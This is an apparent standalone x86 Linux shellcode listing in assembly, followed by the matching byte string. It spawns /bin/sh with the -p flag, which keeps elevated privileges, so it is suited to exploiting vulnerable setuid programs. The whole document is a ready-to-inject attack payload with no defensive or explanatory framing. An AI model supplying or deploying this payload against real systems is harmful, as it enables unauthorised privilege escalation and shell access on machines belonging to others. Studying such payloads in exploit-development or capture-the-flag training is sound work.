global _start

_start:
    push 0xb         ; execve()
    pop eax          ; $eax = execve()

    push 0x68        ; "h"
    push word 0x732f ; "/s"
    push 0x6e69622f  ; "/bin"
    mov ebx, esp     ; $ebx = "/bin/sh"

    cdq              ; $edx = NULL

    push edx         ; "\x00"
    push word 0x702d ; "-p"
    mov esi, esp     ; $esi = "-p"

    push edx         ; "\x00"
    push esi         ; "-p"
    push ebx         ; "/bin/sh"
    mov ecx, esp     ; ["/bin/sh", "-p"]

    int 0x80         ; syscall

; execve("/bin/sh", ["/bin/sh", "-p"], NULL);
; shellcode = b"\x6a\x0b\x58\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x99\x52\x66\x68\x2d\x70\x89\xe6\x52\x56\x53\x89\xe1\xcd\x80"
